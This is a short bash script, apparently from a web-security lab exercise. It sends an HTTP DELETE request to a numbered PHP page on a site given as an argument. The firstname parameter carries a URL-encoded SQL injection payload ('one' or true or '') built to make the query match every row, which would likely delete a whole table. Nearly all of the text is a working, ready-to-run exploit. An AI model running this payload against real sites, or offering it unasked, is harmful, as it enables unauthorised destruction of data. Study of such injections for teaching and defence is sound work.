#!/bin/bash

declare -r site="$1"
declare -r payload="one' or true or '"

curl -i -X DELETE \
	"http://$site/03-post.php?firstname=$(echo $payload | jq -Rr @uri)"
echo
